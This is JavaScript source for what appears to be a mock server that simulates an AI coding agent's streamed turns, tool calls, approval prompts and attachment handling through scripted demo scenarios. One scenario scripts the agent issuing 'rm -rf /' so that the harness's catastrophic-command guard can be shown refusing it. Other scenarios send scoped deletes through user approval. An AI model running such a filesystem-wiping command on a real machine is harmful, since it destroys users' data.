    for (const th of thoughts) {
      if (th === null) {
        this.parts.push({ type: 'text', text: '' });
        index++;
      } else if (th) await this.streamText('thinking', index++, th, spec.pace);
      else {
        this.parts.push({ type: 'thinking', text: '' });
        broadcast({ type: 'stream_delta', session_id: sid, delta: { part: 'thinking', index: index++, text: '' } });
        await this.sleep(120);
      }
    }
    if (text) await this.streamText('text', index++, text, spec.pace);
    const calls = (spec.calls ?? []).map((c) => ({ ...c, id: `call_${hex(6)}` }));
    for (const c of calls) await this.streamCall(index++, c);
    await this.sleep(randInt(60, 150));
    broadcast({ type: 'stream_ended', session_id: sid });
    const content = [];
    for (const th of thoughts) content.push(th === null ? { type: 'text', text: '' } : { type: 'thinking', text: th });
    if (text) content.push({ type: 'text', text });
    for (const c of calls) content.push({ type: 'tool_call', id: c.id, name: c.name, arguments: c.args });
    const usage = stepUsage(rec.info.context.tokens, 16 + tok(thoughts.join(' ')) + tok(text) + tok(JSON.stringify(calls.map((c) => c.args))), this.model);
    addSessionUsage(rec, usage);
    this.phase = 'tools';
    this.parts = [];
    this.pendingCalls = [...calls];
    addEntry(rec, { kind: 'assistant', content, model: this.model, usage, stop: calls.length ? 'tool_use' : 'stop', ...(author ? { author } : {}) });
    const results = [];
    for (const c of calls) results.push(await this.runTool(c));
    return results;
  }
  async streamText(kind, index, text, pace) {
    const part = { type: kind, text: '' };
    this.parts.push(part);
    const cps = Array.from(text);
    const thinking = kind === 'thinking';
    const pieces = Math.min(30, Math.max(8, Math.ceil(cps.length / 14)));
    const big = cps.length > 4000;
    for (let pos = 0; pos < cps.length;) {
      // `pace` (the stream scenario) streams like a real model: ~token-sized chunks at a steady rate.
      // `pace.chunk` / `pace.delay` ([min, max] chars and ms, the flood scenario) stream big chunks fast.
      const n = pace?.chunk ? randInt(...pace.chunk) : pace ? randInt(2, 7) : thinking ? Math.ceil(cps.length / pieces) : big ? randInt(8, 24) : randInt(2, 8);
      const chunk = cps.slice(pos, pos + n).join('');
      pos += n;
      await this.sleep(pace?.delay ? randInt(...pace.delay) : pace ? Math.round((n / (thinking ? pace.think : pace.text)) * 1000)
        : thinking ? Math.round(1000 / pieces) : randInt(20, 35));
      part.text += chunk;
      broadcast({ type: 'stream_delta', session_id: this.sid, delta: { part: kind, index, text: chunk } });
    }
  }
  async streamCall(index, call) {
    const part = { type: 'tool_call', id: call.id, name: call.name, buf: '' };
    this.parts.push(part);
    const json = JSON.stringify(call.args);
    const big = json.length > 2000; // e.g. a 32-task `agent` call: a few seconds, not twenty
    for (let pos = 0; pos < json.length;) {
      const frag = json.slice(pos, pos + (big ? randInt(80, 160) : randInt(6, 18)));
      pos += frag.length;
      await this.sleep(randInt(15, 30));
      part.buf += frag;
      broadcast({ type: 'stream_delta', session_id: this.sid, delta: { part: 'tool_call', index, id: call.id, name: call.name, arguments: frag } });
    }
  }
  async runTool(call) {
    const rec = this.rec, sid = this.sid;
    if (call.name === 'bash' && isCatastrophic(call.args?.command)) {
      // Blocked in every permission mode, YOLO included, and never offered for approval.
      await this.sleep(150);
      this.complete(call, REFUSED_TEXT, true);
      return { call, denied: false, refused: true, is_error: true, text: REFUSED_TEXT };
    }
    const approval = approvalFor(rec, call);
    if (approval) {
      const request = { id: `apr_${hex(6)}`, call_id: call.id, tool: call.name, summary: approval.summary, reason: approval.reason, arguments: call.args, ...(approval.once ? { once: true } : {}) };
      rec.approvals.push(request);
      broadcast({ type: 'approval_requested', session_id: sid, request });
      setStatus(rec, 'awaiting_approval');
      // respond_approval broadcasts approval_resolved and flips the status back to running.
      const decision = await this.waitApproval(request.id);
      if (decision === 'deny') {
        this.complete(call, `The user declined this ${call.name} action. Don't retry it; carry on with other work or ask in the chat.`, true);
        return { call, denied: true, is_error: true };
      }
    }
    rec.info.steps += 1; // like the engine: counted as each call starts running
    emitSession(rec);
    if (call.name === 'bash') markSecretsUsed(call.args?.command);
    const rt = { call_id: call.id, name: call.name, output: '' };
    this.runningTools.push(rt);
    broadcast({ type: 'tool_started', session_id: sid, call_id: call.id, name: call.name });
    const exec = call.exec ?? {};
    let out = null; // { text, is_error, details } from an async `exec.run(turn, call, rt)` hook
    if (exec.run) {
      await this.sleep(exec.duration ?? 200);
      out = await exec.run(this, call, rt);
    } else {
      await this.sleep(exec.chunks?.length ? randInt(150, 300) : exec.duration ?? 400);
      for (const [chunk, delay] of exec.chunks ?? []) {
        await this.sleep(delay);
        this.toolOutput(rt, chunk);
      }
    }
    exec.effect?.(rec);
    this.runningTools = this.runningTools.filter((r) => r !== rt);
    const text = out?.text ?? exec.text ?? (rt.output.trimEnd() || '(no output)');
    const is_error = out ? !!out.is_error : !!exec.is_error;
    this.complete(call, text, is_error, out?.details ?? exec.details);
    return { call, denied: false, is_error, text };
  }
  toolOutput(rt, chunk) {
    rt.output += chunk;
    broadcast({ type: 'tool_output', session_id: this.sid, call_id: rt.call_id, chunk });
  }
  complete(call, text, is_error, details) {
    this.pendingCalls = this.pendingCalls.filter((c) => c !== call);
    addEntry(this.rec, { kind: 'tool_result', call_id: call.id, tool: call.name, content: [{ type: 'text', text }], is_error, ...(details !== undefined ? { details } : {}) });
  }
}

/** Tool results for calls left dangling by a server restart ("interrupted"). */
function resolveDangling(rec) {
  const last = rec.entries.findLast((e) => e.kind === 'assistant');
  if (!last) return;
  const done = new Set(rec.entries.filter((e) => e.kind === 'tool_result' && e.seq > last.seq).map((e) => e.call_id));
  for (const p of last.content) {
    if (p.type === 'tool_call' && !done.has(p.id)) {
      addEntry(rec, { kind: 'tool_result', call_id: p.id, tool: p.name, content: [{ type: 'text', text: 'Outcome unknown: the server restarted while this call was running. Check the current state before retrying.' }], is_error: true });
    }
  }
}
function beginTurn(rec, content, { scenario, onFinish, author } = {}) {
  resolveDangling(rec);
  addEntry(rec, { kind: 'user', content, ...(author ? { author } : {}) });
  const text = ownText(content); // scenarios see what the user typed, not the attached files
  const fallback = attachmentsIn(content)[0]?.name ?? 'Image';
  if (!rec.info.title.trim()) rec.info.title = titleFrom(text || fallback);
  if (rec.untitled) { rec.info.title = titleFrom(text || fallback); rec.untitled = false; } // private chats, titled locally
  rec.info.preview = computePreview(rec.entries);
  rec.info.status = 'running';
  emitSession(rec);
  startTurn(rec, text, scenario, onFinish);
}
function startTurn(rec, text, scenario, onFinish) {
  if (rec.info.kind === 'job') {
    const run = (state.jobRuns ?? []).find((r) => r.session_id === rec.info.id);
    const job = run && state.jobs.find((j) => j.id === run.job_id);
    if (job) {
      run.outcome = 'running';
      delete run.ended_at;
      if (job.last_session === run.session_id) {
        job.last_status = 'running';
        delete job.last_end;
        broadcast({ type: 'job_updated', job });
      }
      onFinish = (outcome) => jobRunEnded(job, run, outcome === 'ok' ? 'ok' : outcome === 'aborted' ? 'stopped' : 'error');
    }
  }
  const turn = new Turn(rec, onFinish);
  rec.turn = turn;
  const run = scenario ?? pickScenario(text, rec);
  (async () => {
    try {
      await turn.sleep(randInt(250, 600));
      await run(turn, text, rec);
      while (rec.steers.length) {
        const notesOnly = rec.steers.every((w) => w.author);
        await turn.step({
          thinking: 'Something arrived after my last answer; make sure it is reflected before ending the turn.',
          text: notesOnly ? 'Nothing above needs redoing.'
            : "I've folded that in. Nothing above needs redoing, and I'll take it into account for the remaining work. Tell me if you want me to act on it right away.",
        });
      }
      finishTurn(rec, turn);
    } catch (err) {
      if (err === CANCELLED || turn.cancelled) return;
      if (err?.turnFailed) { // the engine's Outcome::Failed: an error notice, status error
        rec.turn = null;
        addEntry(rec, { kind: 'notice', level: 'error', text: err.turnFailed });
        setStatus(rec, 'error');
        turn.onFinish?.('error');
        return;
      }
      console.error('[mock] turn crashed:', err);
      rec.turn = null;
      addEntry(rec, { kind: 'notice', level: 'error', text: `Mock server error: ${err.message}` });
      setStatus(rec, 'error');
      turn.onFinish?.('error');
    }
  })();
}
/** The turn ended normally: run the next follow-up, a pending subagent summary, or go idle; then tell `onFinish`. */
function finishTurn(rec, turn) {
  rec.turn = null;
  turn.phase = 'idle';
  rec.info.preview = computePreview(rec.entries);
  const said = [...rec.entries].reverse().find((e) => e.kind === 'user' && !e.author);
  if (said && /\bremember\b/i.test(textOf(said.content))) later(300, () => startMemoryReview(rec, textOf(said.content)));
  if (rec.sendNow.length) handOff(rec);
  else if (rec.followups.length) drainQueue(rec);
  else if (!maybeSummarize(rec)) setStatus(rec, 'idle');
  turn.onFinish?.('ok');
}
function drainQueue(rec) {
  const w = rec.followups.shift();
  emitQueue(rec);
  addEntry(rec, { kind: 'user', content: w.content, ...(w.author ? { author: w.author } : {}) });
  rec.info.preview = computePreview(rec.entries);
  rec.info.status = 'running';
  emitSession(rec);
  startTurn(rec, ownText(w.content));
}
function abortTurn(rec, { handoff = false } = {}) {
  const turn = rec.turn;
  if (!turn) {
    if (rec.compactTimer) { clearTimeout(rec.compactTimer); rec.compactTimer = null; setStatus(rec, 'idle'); }
    return;
  }
  turn.cancel();
  rec.turn = null;
  const sid = rec.info.id;
  if (turn.phase === 'stream') {
    broadcast({ type: 'stream_ended', session_id: sid });
    const content = turn.parts.filter((p) => p.type !== 'tool_call' && p.text).map((p) => ({ type: p.type, text: p.text }));
    const usage = stepUsage(rec.info.context.tokens, content.reduce((n, p) => n + tok(p.text), 0), turn.model);
    addSessionUsage(rec, usage);
    addEntry(rec, { kind: 'assistant', content, model: turn.model, usage, stop: 'aborted', ...(turn.speaker ? { author: turn.speaker } : {}) });
  }
  for (const req of rec.approvals) broadcast({ type: 'approval_resolved', session_id: sid, request_id: req.id, decision: 'deny' });
  rec.approvals = [];
  for (const call of turn.pendingCalls) {
    addEntry(rec, { kind: 'tool_result', call_id: call.id, tool: call.name, content: [{ type: 'text', text: 'Aborted by user' }], is_error: true });
  }
  turn.pendingCalls = [];
  turn.runningTools = [];
  turn.phase = 'idle';
  const steers = handoff ? [] : rec.steers.splice(0);
  if (steers.length) {
    // Never lose what the user typed: un-injected steers become the first follow-ups (like the engine).
    rec.followups.unshift(...steers.filter((w) => !w.author));
    // Parked harness notes (goal, subagent reports) land now, as they would on an idle session.
    for (const w of steers.filter((x) => x.author)) addEntry(rec, { kind: 'user', content: w.content, author: w.author });
    emitQueue(rec);
  }
  rec.info.preview = computePreview(rec.entries);
  if (!handoff) setStatus(rec, rec.bridgedHelper ? 'interrupted' : 'idle');
  turn.onFinish?.('aborted');
}

const STOP_PAUSE = 400; // ms the agent takes to stop for a "send now" (its card shows it is being sent)
/** "Send now" (engine interrupt()): stop the running turn (or compaction); what was sent starts the next turn. */
function interrupt(rec, w) {
  const busy = rec.turn || rec.compactTimer || rec.info.status === 'compacting';
  if (!busy) return beginTurn(rec, w.content);
  if (rec.info.parent_id) { // a subagent's turns belong to its parent: it is steered
    rec.steers.push(w);
    return emitQueue(rec);
  }
  rec.sendNow.push(w);
  emitQueue(rec);
  rec.sendNowTimer ??= later(STOP_PAUSE, () => {
    rec.sendNowTimer = null;
    if (state.sessions.get(rec.info.id) === rec) handOff(rec);
  });
}
/** The turn stopped for what was sent now (or ended meanwhile): the next one starts with it, the chat still busy. */
function handOff(rec) {
  const first = rec.sendNow.splice(0);
  if (!first.length) return; // withdrawn, or Stop kept it queued
  if (rec.compactTimer) { clearTimeout(rec.compactTimer); rec.compactTimer = null; }
  if (rec.turn) abortTurn(rec, { handoff: true });
  for (const x of first.slice(0, -1)) addEntry(rec, { kind: 'user', content: x.content });
  beginTurn(rec, first[first.length - 1].content);
  emitQueue(rec);
}

// ─── attachments (engine attach()) ──────────────────────────────────────────
const MAX_FILE = 25 << 20, MAX_INLINE = 64 << 10, MAX_FILES = 10;
const IMAGE_MIMES = new Set(['image/png', 'image/jpeg', 'image/gif', 'image/webp']);
const UPLOAD_DIR = `${HOME}/.cache/tessera/uploads`;
/** core::util::human_bytes: "512 B", "1.2 KB", "3.4 MB" (one decimal, ties to even like Rust's `{:.1}`). */
function humanBytes(n) {
  const units = ['B', 'KB', 'MB', 'GB'];
  let v = n, u = 0;
  while (v >= 1024 && u < units.length - 1) { v /= 1024; u++; }
  if (u === 0) return `${n} B`;
  const x = v * 10;
  let r = Math.round(x);
  if (x - Math.floor(x) === 0.5 && r % 2) r -= 1;
  return `${(r / 10).toFixed(1)} ${units[u]}`;
}
/** The file name part, without control characters, at most 120 characters ("file" when nothing is left). */
function attachmentName(raw) {
  const base = String(raw ?? '').split(/[/\\]/).pop() ?? '';
  const name = [...base].filter((c) => !/\p{Cc}/u.test(c)).slice(0, 120).join('');
  return !name.trim() || name === '.' || name === '..' ? 'file' : name.trim();
}
const utf8 = new TextDecoder('utf-8', { fatal: true, ignoreBOM: true });
/**
 * `send`'s attachments → content parts appended after the user's own: images stay images, other files are
 * "saved" under ~/.cache/tessera/uploads/<session>/ (text ≤ 64 KB is inlined too). Private chats keep
 * everything in memory: text (≤ 256 KB) and images only. Throws bad_request like the engine.
 */
function attach(rec, content, files) {
  if (files.length > MAX_FILES) throw badRequest('attach at most 10 files at a time');
  const sid = rec.info.id;
  const priv = rec.info.private;
  const saved = new Set(state.uploads.get(sid) ?? []);
  const parts = [];
  let total = 0;
  for (const f of files) {
    const name = attachmentName(f?.name);
    const data = String(f?.data ?? '').trim();
    if (data.length % 4 || !/^[A-Za-z0-9+/]*={0,2}$/.test(data)) throw badRequest(`${name}: not valid base64`);
    const bytes = Buffer.from(data, 'base64');
    total += bytes.length;
    if (bytes.length > MAX_FILE || total > 2 * MAX_FILE) throw badRequest(`${name} is too large (25 MB per file, 50 MB per message)`);
    const mime = String(f?.mime ?? '').split(';')[0].trim().toLowerCase();
    if (IMAGE_MIMES.has(mime)) {
      parts.push({ type: 'image', mime, data: String(f.data) });
      continue;
    }
    let text = null;
    try { text = utf8.decode(bytes); } catch { /* not UTF-8: binary */ }
    if (text?.includes('\0')) text = null;
    const size = humanBytes(bytes.length);
    if (priv) {
      if (text == null || bytes.length > 4 * MAX_INLINE) {
        throw badRequest(`${name}: private chats can take text files and images only, because nothing from them is written to disk`);
      }
      parts.push({ type: 'text', text: `[Attached file: ${name} · ${size}]\n\`\`\`\n${text}\n\`\`\`` });
      continue;
    }
    let file = name;
    for (let n = 1; saved.has(file); n++) {
      const dot = name.lastIndexOf('.');
      file = dot >= 0 ? `${name.slice(0, dot)} (${n})${name.slice(dot)}` : `${name} (${n})`;
    }
    saved.add(file);
    let note = `[Attached file: ${name} · ${size} · saved at ${UPLOAD_DIR}/${sid}/${file}]`;
    if (text != null && bytes.length <= MAX_INLINE) note += `\n\`\`\`\n${text}\n\`\`\``;
    else if (text != null) note += '\n(Large text file: read it with the `read` tool.)';
    else note += '\n(Binary file: use tools that understand it, e.g. `pdftotext` for PDFs.)';
    parts.push({ type: 'text', text: note });
  }
  if (!priv) state.uploads.set(sid, saved);
  content.push(...parts);
}
/** The attachments described by `[Attached file: …]` parts: { name, size, path?, kind: text|large|binary, lines }. */
function attachmentsIn(parts) {
  return (parts || []).filter((p) => p?.type === 'text' && ATTACHED_RE.test(p.text)).map((p) => {
    const [head, ...rest] = p.text.split('\n');
    const m = head.match(/^\[Attached file: (.+?) · (\d+ B|\d+\.\d [KMG]B)(?: · saved at (.+))?\]$/) ?? [];
    const body = rest.join('\n');
    const kind = body.startsWith('```') ? 'text' : body.startsWith('(Large') ? 'large' : 'binary';
    return { name: m[1] ?? 'file', size: m[2] ?? '', ...(m[3] ? { path: m[3] } : {}), kind, lines: kind === 'text' ? body.split('\n').length - 2 : 0 };
  });
}
const lastUserContent = (rec) => rec.entries.findLast((e) => e.kind === 'user' && !e.author)?.content ?? [];
/** How an answer acknowledges what came with the message (files by name, images by count), or null. */
function attachmentAck(content) {
  const files = attachmentsIn(content);
  const images = content.filter((p) => p?.type === 'image').length;
  const count = files.length + images;
  if (!count) return null;
  const lines = files.map((f) => `- **${f.name}** (${f.size}): ${
    f.kind === 'text' ? `text, ${f.lines} line${f.lines === 1 ? '' : 's'}; I've read it`
      : f.kind === 'large' ? `a large text file, saved at \`${f.path}\`; I'll go through it with \`read\``
        : `binary, saved at \`${f.path}\`; I'll need a tool that understands the format`}`);
  if (images) lines.push(`- ${images === 1 ? 'an image' : `${images} images`}, which I can see`);
  const names = files.map((f) => `"${f.name}"`);
  if (images) names.push(images === 1 ? 'an image' : `${images} images`);
  return {
    count,
    text: `Got ${count === 1 ? 'your attachment' : `your ${count} attachments`}:\n\n${lines.join('\n')}`,
    thinking: `They attached ${names.join(', ')}. Acknowledge ${count === 1 ? 'it' : 'them'} by name before answering.`,
  };
}

// ─── scenarios ──────────────────────────────────────────────────────────────
function toChunks(output) {
  if (!output) return [];
  const lines = output.split('\n');
  return lines.map((l, i) => [
    l + (i < lines.length - 1 ? '\n' : ''),
    /^\s*(Compiling|Fetching|Updating|Scanning|==>)/.test(l) ? randInt(250, 380) : /^\s*(Finished|Running|Doc-tests)/.test(l) ? 200 : randInt(25, 60),
  ]);
}
const bashCall = (command, output, { exit = 0, approval } = {}) => ({
  name: 'bash', args: { command }, approval,
  exec: { chunks: toChunks(output), duration: 600, is_error: exit !== 0, details: { exit_code: exit }, text: output || '(no output)' },
});

async function scenarioDemo(t) {
  const plan = [
    { text: 'Baseline: cargo test --workspace', status: 'in_progress' },
    { text: 'Switch src/main.rs to #[tokio::main] + anyhow', status: 'pending' },
    { text: 'Clear stale incremental build artifacts', status: 'pending' },
    { text: 'Summarize the change with evidence', status: 'pending' },
  ];
  const goal = 'Tidy the CLI entry point and prove the workspace still passes its tests';
  await t.step({
    thinking: 'The user wants the full walkthrough. Register a task first so the plan is visible in the ledger, then take a baseline from the test suite before changing anything. The change itself: src/main.rs builds a Tokio runtime by hand and maps errors to ExitCode manually; #[tokio::main] plus anyhow is shorter and keeps error context. Clearing target/debug/incremental afterwards deletes files, so that will need approval.',
    text: "I'll track this as a task so progress is visible, then start with a baseline test run.",
    calls: [{
      name: 'task', args: { goal, plan },
      exec: {
        duration: 300, text: 'Task ledger updated: goal set, 4 plan items.',
        effect: (rec) => {
          rec.info.task = {
            ...emptyLedger(), goal, plan: clone(plan),
            constraints: ['Do not change CLI flags or exit codes users rely on'],
            done_criteria: ['cargo test --workspace passes after the change', 'tessera --help output is unchanged'],
          };
          emitSession(rec);
        },
      },
    }],
  });
  await t.step({
    thinking: 'Ledger is set. Baseline next: run the whole workspace, so any later failure is clearly caused by my change.',
    text: 'Baseline first:',
    calls: [bashCall('cargo test --workspace', WORKSPACE_TEST_OUTPUT)],
  });
  await t.step({
    thinking: '21 passed, 0 failed. Now the edit. old_string must match exactly once; nearly every line changes, so replace the whole file body.',
    text: 'All 21 tests pass, so we have a clean baseline. Now the actual change: `src/main.rs` builds the Tokio runtime by hand and maps every error to `ExitCode`; `#[tokio::main]` with `anyhow` does the same in half the lines and keeps error context.',
    calls: [{ name: 'edit', args: { path: 'src/main.rs', old_string: MAIN_OLD, new_string: MAIN_NEW }, exec: { duration: 500, text: 'Edited src/main.rs: 1 replacement (+6 −17)', details: { diff: MAIN_DIFF } } }],
  });
  const [rm] = await t.step({
    thinking: 'Edit applied cleanly. The incremental cache still holds artifacts for the old entry point. Removing target/debug/incremental is safe (cargo rebuilds it) but it is a recursive delete outside the edit allowlist, so it goes through approval.',
    text: 'Edit applied. The incremental cache still holds artifacts for the old entry point, which can confuse rust-analyzer, so I\'ll clear it. This deletes files, so it needs your approval.',
    calls: [bashCall('rm -rf target/debug/incremental', '', { approval: { summary: 'rm -rf target/debug/incremental', reason: 'Deletes files outside the edit allowlist' } })],
  });
  await t.step({
    thinking: rm.denied ? 'The cleanup was denied. It was optional, so summarize and note that it was skipped.' : 'Cleanup approved and done. Summarize: what changed, the evidence, and a sensible next step.',
    text: demoFinal(rm.denied),
  });
}
async function scenarioBash(t, text) {
  const build = /\bbuild/i.test(text) && !/\btest/i.test(text);
  await t.step({
    thinking: build ? 'A release build is the quickest way to answer this. Report time, size and any warnings.' : "Run the server crate's tests and report what they cover, not just the pass count.",
    text: build ? 'Building a release binary.' : "I'll run the server crate's tests.",
    calls: [bashCall(build ? 'cargo build --release' : 'cargo test -p tessera-server', build ? BUILD_OUTPUT : SERVER_TEST_OUTPUT)],
  });
  await t.step({ thinking: 'Clean run. Summarize briefly and suggest one useful follow-up.', text: build ? BUILD_ANSWER : TEST_ANSWER });
}
async function scenarioEdit(t) {
  await t.step({
    thinking: 'Symptom points at the WebSocket event loop in the server. Read it before touching anything.',
    text: 'Let me look at the event loop in the WebSocket handler first.',
    calls: [{ name: 'read', args: { path: 'crates/server/src/ws.rs' }, exec: { duration: 350, text: numbered(WS_SRC, 44) } }],
  });
  await t.step({
    thinking: 'Found it: `let event = event?;` turns RecvError::Lagged into a fatal error and drops the socket. Lagged should be a resync hint; only Closed should end the loop.',
    text: "Found it: `event?` turns a lagged receiver into a fatal error, so slow clients get disconnected. Lag should just tell the client to resync; only `Closed` should end the loop.",
    calls: [{ name: 'edit', args: { path: 'crates/server/src/ws.rs', old_string: WS_OLD, new_string: WS_NEW }, exec: { duration: 450, text: 'Edited crates/server/src/ws.rs: 1 replacement (+11 −4)', details: { diff: WS_DIFF } } }],
  });
  await t.step({ thinking: 'Explain the bug and the change; offer to run tests and add a regression test.', text: EDIT_ANSWER });
}
async function scenarioApproval(t, text) {
  const deploy = /\bdeploy/i.test(text);
  const cmd = deploy ? './scripts/deploy.sh staging' : 'rm -rf build/ dist/';
  const [r] = await t.step({
    thinking: deploy ? 'Deploying runs a script with network access against a shared environment. Ask first.' : 'Recursive delete of build output: harmless in practice, but it deletes files outside the edit allowlist, so it needs approval.',
    text: deploy ? "I'll deploy to staging. This needs your approval since it talks to a shared server." : "I'll remove the build output directories. This deletes files, so it needs your approval.",
    calls: [bashCall(cmd, deploy ? DEPLOY_OUTPUT : '', { approval: { summary: cmd, reason: deploy ? 'Runs a deployment script with network access' : 'Deletes files outside the edit allowlist' } })],
  });
  await t.step({ thinking: r.denied ? 'Denied. Respect it and offer a gentler alternative.' : 'Done. Report the outcome and how to undo it.', text: approvalAnswer(deploy, r.denied) });
}
async function scenarioError(t) {
  await t.step({
    thinking: 'Reproduce the failure first; the test output will say more than guessing.',
    text: 'Running the core tests to see the failure.',
    calls: [bashCall('cargo test -p tessera-core', FAIL_OUTPUT, { exit: 101 })],
  });
  await t.step({
    thinking: 'since_seq_returns_tail: expected [5, 6], got [4, 5, 6]. The query is inclusive (>=) where the protocol says strictly after. Explain, show the one-character fix, ask before applying.',
    text: ERROR_ANSWER,
  });
}
async function scenarioLong(t) {
  await t.step({
    thinking: 'They want the long form. Structure it: data model, sequence numbers, server guarantees, backpressure, reconnect policy, approvals, restarts, testing, then a summary. Include code for both sides and a failure table.',
    text: LONG_ANSWER,
  });
}
async function scenarioDefault(t, text, rec) {
  const ack = attachmentAck(lastUserContent(rec)); // attached files are named before the answer
  if (ack && !text.trim()) {
    await t.step({ thinking: ack.thinking, text: `${ack.text}\n\nWhat would you like me to do with ${ack.count === 1 ? 'it' : 'them'}?` });
    return;
  }
  const bot = sessionBot(rec);
  if (bot) { // bot chats and duties answer in the bot's voice
    const r = botChatReply(bot, text);
    if (ack) r.text = `${ack.text}\n\n${r.text}`;
    return speak(t, r);
  }
  await t.step({ thinking: [ack?.thinking, defaultThinking(text, rec)].filter(Boolean).join(' '), text: [ack?.text, defaultAnswer(text, rec)].filter(Boolean).join('\n\n') });
}
async function scenarioNuke(t) {
  const [r] = await t.step({
    thinking: 'They asked to nuke everything. Taken literally that is `rm -rf /`. The harness refuses catastrophic commands in every permission mode, so this demonstrates the guard rather than doing any damage.',
    text: 'Taking that literally: wiping the filesystem.',
    calls: [bashCall('rm -rf /', '')],
  });
  await t.step({
    thinking: r.refused ? 'Refused by the harness, as it should be. Explain what is blocked and why, and offer a scoped alternative.' : 'The command did not run. Explain and offer a scoped alternative.',
    text: NUKE_ANSWER,
  });
}
const FOLLOW_SRC = md`
export function followTail(scroller: HTMLElement, content: HTMLElement) {
  let pinned = true;
  const snap = () => { if (pinned) scroller.scrollTop = scroller.scrollHeight; };
  const ro = new ResizeObserver(snap);
  ro.observe(content);
  ro.observe(scroller);
  scroller.addEventListener("scroll", () => {
    pinned = scroller.scrollHeight - scroller.scrollTop - scroller.clientHeight < 24;
  }, { passive: true });
  return () => ro.disconnect();
}`;
/**
 * "stream": a long, realistically paced reply in three steps (thinking → a tool with live output → a quick
 * read → a long answer), so a steer typed during the first step visibly waits in the queue.
 */
async function scenarioStream(t) {
  const pace = { think: 110, text: 190 };
  await t.step({
    pace,
    thinking: STREAM_THINKING,
    text: "I'll get a baseline from the test suite first, then walk through how streaming stays smooth end to end.",
    calls: [bashCall('cargo test --workspace', [...WORKSPACE_TEST_OUTPUT.split('\n'), ...WORKSPACE_TEST_OUTPUT.split('\n')].join('\n'))],
  });
  await t.step({
    pace,
    thinking: 'Tests pass. Before writing it up, check how the transcript follows the tail, so the explanation matches the code.',
    text: 'All green. One quick look at how the transcript follows the tail, so the explanation matches the code.',
    calls: [{ name: 'read', args: { path: 'apps/tessera/ui/src/lib/follow-tail.ts' }, exec: { duration: 900, text: numbered(FOLLOW_SRC) } }],
  });
  await t.step({ pace, thinking: 'Matches what I expected. Now the long explanation, structured with headings, a table and code so every renderer path is exercised.', text: STREAM_ANSWER });
}

// ─── flood: scroll stress test ──────────────────────────────────────────────
const FLOOD_PACE = { chunk: [20, 60], delay: [25, 40] };
const FLOOD_STEPS = 5; // steps 1–4 each run 1–2 bash calls; step 5 is the final answer
const FLOOD_PHRASES = [
  'keep the tail pinned', 'no jump when a block closes', 'fold thinking in place', 'a fence opens mid-stream',
  'tables grow row by row', 'render it, do not read it', 'one markdown pass per frame', 'tail the tool output live',
  'scroll up to detach', 'come back down to re-pin', 'resize the tile now', 'keep the measured heights',
];
const floodPhrase = (i) => FLOOD_PHRASES[i % FLOOD_PHRASES.length];
function floodThinking(k) {
  return Array.from({ length: randInt(80, 150) }, (_, i) => `step ${k} · thought ${i + 1}: ${floodPhrase(i + k)}.`).join('\n');
}
/** ~150–250 lines: numbered lines, a bullet list, a ~40-line code block, a small table, more numbered lines. */
function floodText(k, final) {
  const target = randInt(150, 250);
  const head = [final ? `## Flood complete: step ${k} of ${FLOOD_STEPS}` : `## Step ${k} of ${FLOOD_STEPS}: stress batch ${k}`, ''];
  const numbered = (from, n) => Array.from({ length: n }, (_, i) => `${from + i}. step ${k} · line ${from + i}: ${floodPhrase(from + i)}`);
  const bullets = Array.from({ length: randInt(25, 40) }, (_, i) => `- **${k}.${i + 1}** ${floodPhrase(i * 5 + k)}`);
  const code = ['```rust', `fn flood_step_${k}(frame: &mut Frame) -> Result<()> {`,
    ...Array.from({ length: 38 }, (_, i) => `    let v${String(i + 1).padStart(2, '0')} = frame.measure(${k}, ${i + 1})?;`),
    '    Ok(())', '}', '```'];
  const table = ['| Row | Step | Height | Status |', '|---:|---:|---:|---|',
    ...Array.from({ length: 8 }, (_, i) => `| ${i + 1} | ${k} | ${randInt(18, 240)} px | ${i % 3 ? 'ok' : 'remeasured'} |`)];
  const first = numbered(1, 40);
  const body = [...head, ...first, '', ...bullets, '', ...code, '', ...table, ''];
  const rest = Math.max(10, target - body.length - 2);
  return [...body, ...numbered(41, rest), '', final ? 'That was the whole flood: about 2000 lines. Scroll up and back down to check the pinning.' : `Step ${k} done; running the next batch.`].join('\n');
}
function floodBash(k, run) {
  const n = randInt(60, 100);
  const lines = Array.from({ length: n }, (_, i) => `line ${String(i + 1).padStart(4, '0')} · ok  chunk ${i + 1}/${n} (step ${k}, run ${run})`);
  return {
    name: 'bash', args: { command: `./scripts/flood.sh --step ${k} --run ${run} --lines ${n}` },
    exec: { chunks: lines.map((l, i) => [l + (i < n - 1 ? '\n' : ''), randInt(20, 30)]), details: { exit_code: 0 }, text: lines.join('\n') },
  };
}
/** "flood": ~2000 lines streamed fast over five steps (thinking, markdown, live tool output) for scroll testing. */
async function scenarioFlood(t) {
  for (let k = 1; k <= FLOOD_STEPS; k++) {
    const final = k === FLOOD_STEPS;
    await t.step({
      pace: FLOOD_PACE,
      thinking: floodThinking(k),
      text: floodText(k, final),
      calls: final ? [] : Array.from({ length: randInt(1, 2) }, (_, i) => floodBash(k, i + 1)),
    });
  }
}

// ─── private chats ──────────────────────────────────────────────────────────
const PRIVATE_NOTE = '_Private chat: nothing here is saved to disk, remembered or searchable, and it is gone when you delete it or the server restarts._';
const PRIVATE_SEARCH_RE = /\?|^\s*(who|what|when|where|which|why|how|is|are|does|do|can|should)\b|\b(search|look up|find|latest|news|current|today|price|weather|best|compare|recommend|review)/i;
/** Three fake results about whatever was asked (reserved .example domains). */
function privateResults(query) {
  const topic = truncate(query || 'this', 60);
  const slug = topic.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 48) || 'topic';
  return [
    { title: `${capFirst(topic)}: what you need to know`, url: `https://guide.example/${slug}`, note: 'a plain-language overview of the main options and their trade-offs' },
    { title: `${capFirst(topic)}, compared (2026)`, url: `https://compare.example/${slug}`, note: 'a side-by-side comparison, updated this year' },
    { title: `Ask the community: ${topic}`, url: `https://forum.example/t/${slug}`, note: 'first-hand experiences: useful, but anecdotal' },
  ];
}
/** Private chats only get web search: answer directly, or search once and answer. Never files, shell or bots. */
async function scenarioPrivate(t, text, rec) {
  const q = quoteOf(text, 140);
  const ack = attachmentAck(lastUserContent(rec));
  if (ack && !text.trim()) {
    await t.step({ thinking: ack.thinking, text: `${ack.text}\n\nWhat would you like to know about ${ack.count === 1 ? 'it' : 'them'}?\n\n${PRIVATE_NOTE}` });
    return;
  }
  const withAck = (s) => (ack ? `${ack.text}\n\n${s}` : s);
  if (isGreeting(text) || !PRIVATE_SEARCH_RE.test(text)) {
    await t.step({
